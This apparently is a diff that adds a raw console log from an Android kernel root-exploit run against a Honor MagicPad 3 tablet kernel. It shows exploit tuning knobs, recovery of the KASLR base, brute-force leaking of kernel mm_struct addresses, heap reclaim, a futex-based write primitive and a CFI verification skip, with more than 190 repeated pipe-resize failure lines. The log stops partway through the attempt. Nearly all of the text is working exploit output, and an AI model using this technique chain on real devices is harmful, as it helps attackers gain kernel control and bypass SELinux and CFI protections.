@@ -1,0 +1,404 @@
+=== dc_ksu_run start ===
+boot_id_before=635323ed-f6e0-45f0-bf5d-f4dc609f7666
+enforce_before=Enforcing
+uid_before=2000
+uptime_at_launch=283
+KASLR_BASE=0xffffffe0b0000000
+=== OPTS in effect (/data/local/tmp/ksu/OPTS) ===
+  ALLOW_MULTISHOT=1
+=== route/knobs actually exported ===
+  GW_CHAIN=<unset>
+  BRIDGE_ROUTE=<unset>
+  SELINUX_ROUTE=<unset>
+  SELINUX_TARGET=<unset>
+  SLIDE_TARGET_OVERRIDE=<unset>
+  SLIDE_TARGET_IMG_OFF=<unset>
+  SLIDE_WRITE_PC=<unset>
+  SLIDE_FORCE_PSELECT=1
+  CFI_SKIP_VERIFY=1
+  KSNITCH_CPU=8
+  CFI_LSEEK_PROBE=<unset>
+  SLIDE_FMPS_NO_BREAK=<unset>
+  EXPLOIT_ATTEMPTS=<unset>
+  STACK_WRITER_DELAY_USEC=<unset>
+  PSELECT_DELAY_USEC=<unset>
+  SLIDE_ENTER_DELAY_USEC=<unset>
+  SLIDE_FMPS_ATTEMPTS=<unset>
+  GW_KEEPPAGE=<unset>
+  USE_SIGRETURN=<unset>
+=== carrier: sigreturn (dc14-sig) ===
+[32m[+] [0mpreload supervisor pid=13817 attempts=8 base_delay=20000 p0_timeout=1200 timeout=2200
+[32m[+] [0mexploit attempt=1/8 pid=13820 delay=25000 p0_offset=scan
+[32m[+] [0mstartup context pid=13820 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=13820 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=13820 label=cga-w00-6.1.157-honor-magicpad3-app stack_writer=sigreturn reclaim=legacy fops=bank pipe=before-fops
+[32m[+] [0mp0 profile pid=13820 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029542434 bootid_data=ffffff802a4f6078 init_task=ffffff802a0bf6c0 root_tg=ffffff802a5ca580 sysctl_bootid=ffffff802a71dad8
+[33m[*] [0mslide sigreturn preflight ret=0 errno=0 done=1 status=1 fpsimd=1 sve=0 offset=0xe8 records=1
+[33m[*] [0mslide sigreturn record index=0 area=main magic=46508001 size=528
+[32m[+] [0mslide-kaslr-env-override pid=13820 base=ffffffe0b0000000 slide=00000020a8000000 p0_offset=0
+[33m[*] [0mkernelsnitch identity window [ffffff6000000000-ffffff9000000000]
+[33m[*] [0mparameters cpu (8) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (5) mte disabled
+[33m[*] [0mKernelSnitch profile mode=1 fast=1 appended=2048 repeat=32 average=4
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007af843b0e0
+[33m[*] [0m  00000068052ae2b8
+[33m[*] [0m  0000006805f8f9c0
+[33m[*] [0m  00000068063738e0
+[33m[*] [0m  0000006806cf7500
+[33m[*] [0mfound 4 collisisons
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff6000000000-ffffff6600000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff8a00000000-ffffff9000000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff6600000000-ffffff6c00000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8400000000-ffffff8a00000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff7e00000000-ffffff8400000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff7800000000-ffffff7e00000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff7200000000-ffffff7800000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff6c00000000-ffffff7200000000]
+[33m[*] [0mdone
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[31m[-] [0mresize_pipe_slots soft-fail slots=32 want=131072 errno=1 cur=8192
+[33m[*] [0mfresh physrw pipe page=ffffff889f720000
+[33m[*] [0mkernelsnitch identity window [ffffff6000000000-ffffff9000000000]
+[33m[*] [0mparameters cpu (8) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (5) mte disabled
+[33m[*] [0mKernelSnitch profile mode=0 fast=1 appended=2048 repeat=32 average=4
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007af843b0e0
+[33m[*] [0m  000000680532b6a0
+[33m[*] [0m  00000068055125d8
+[33m[*] [0m  00000068055e1c50
+[33m[*] [0m  0000006806318608
+[33m[*] [0mfound 4 collisisons
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  2] start finding mm_struct [ffffff6c00000000-ffffff7200000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff7800000000-ffffff7e00000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff6600000000-ffffff6c00000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff6000000000-ffffff6600000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff7200000000-ffffff7800000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff7e00000000-ffffff8400000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8400000000-ffffff8a00000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff8a00000000-ffffff9000000000]
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[33m[*] [0mkernel page prepare mode=0 attempt=1/8 elapsed_ms=1341 base=0000000000000000
+[31m[-] [0mprepare_kernel_page retry 1/8
+[33m[*] [0mkernelsnitch identity window [ffffff6000000000-ffffff9000000000]
+[33m[*] [0mparameters cpu (8) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (5) mte disabled
+[33m[*] [0mKernelSnitch profile mode=0 fast=1 appended=2048 repeat=32 average=4
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007af843b0e0
+[33m[*] [0m  000000680526b0a0
+[33m[*] [0m  000000680674f7c0
+[33m[*] [0m  0000006806c0ad98
+[33m[*] [0m  0000006807e69090
+[33m[*] [0mfound 4 collisisons
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff6000000000-ffffff6600000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff6600000000-ffffff6c00000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff6c00000000-ffffff7200000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff7800000000-ffffff7e00000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff7e00000000-ffffff8400000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff7200000000-ffffff7800000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff8a00000000-ffffff9000000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8400000000-ffffff8a00000000]
+[33m[*] [0mmm leaked=ffffff89499e7800 base=ffffff89499e0000 object_index=30
+[33m[*] [0mWRITE-GEOM target=ffffffe0b253c340 pc=ffffff89499e1000 canon=1 kaslr_done=1 kaslr_base=ffffffe0b0000000 slide_p0_off=0000000000000000
+[33m[*] [0msk_buff reclaim sndbuf request=16777216 effective=16777216 set_ret=0 set_errno=0 get_ret=0 get_errno=0
+[33m[*] [0mmm drain child reaped after reclaim index=1/2 pid=20523
+[33m[*] [0mmm drain child reaped after reclaim index=2/2 pid=20555
+[33m[*] [0mmm quiet reclaim window completed deferred-exits=2
+[33m[*] [0mmm late cpu-partial drain triggers=2
+[33m[*] [0msk_buff reclaim sends=4/4 mode=0 stop_errno=0
+[33m[*] [0mdone
+[33m[*] [0mkernel page prepare mode=0 attempt=2/8 elapsed_ms=1387 base=ffffff89499e0000
+[33m[*] [0mdurable log checkpoint stage=fops-page-held
+[33m[*] [0mCP main: before-preopen
+[33m[*] [0mpreopen ashmem fd=3 (write-primitive channel)
+[33m[*] [0mCP main: after-preopen
+[33m[*] [0mpreopen configfs selfcheck ret=0 target=ffffffe0b24f6078 val=0000000000000000 errno=0
+[32m[+] [0mGW_CHAIN probe: getenv=NULL
+[33m[*] [0mCP main: before-slide-route
+[33m[*] [0mPROBE2 route-slot enter slot=4
+[33m[*] [0mPROBE route-slot enter slot=4
+[33m[*] [0mapp fops slide route slot=4 parent=ffffff89499e1000 target=ffffffe0b253c340 lock=ffffff89499e4600 delay=50000 fine_ticks=0
+[33m[*] [0mslide pre-waitpid child=23868
+[32m[+] [0mslide child context stack_writer=sigreturn pid=23868 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=23870
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=23870
+[33m[*] [0mslide stack waiter tree=ffffff89499e1000/ffffffe0b253c340/0000000000000000 pi=ffffff89499e1000/ffffffe0b253c340/0000000000000000 task=ffffffe0b20bf6c0 lock=ffffff89499e4600 off=0xe8
+[33m[*] [0mslide pi stage=cmp-wait-blocked tid=23869 waited_ms=0 nr=98
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 tid=23869
+[33m[*] [0mslide pi stage=deadlock-accepted tid=23869
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-accepted ret=-1 errno=110 tid=23869
+[33m[*] [0mslide pi stage=writer-enter tid=23869
+[33m[*] [0mslide pi stage=waiter-hold-chain CLT tid=23869
+[33m[*] [0mslide res-encode consumer firing sched_setattr tid=23869
+[33m[*] [0mslide pselect blocked ready=-1 ready_usec=0 ready_wchan=<not-read> guard=-1 guard_usec=0 guard_wchan=<not-read> age_usec=0 tid=23869
+[33m[*] [0mslide res-encode consumer firing sched_setattr tid=23869
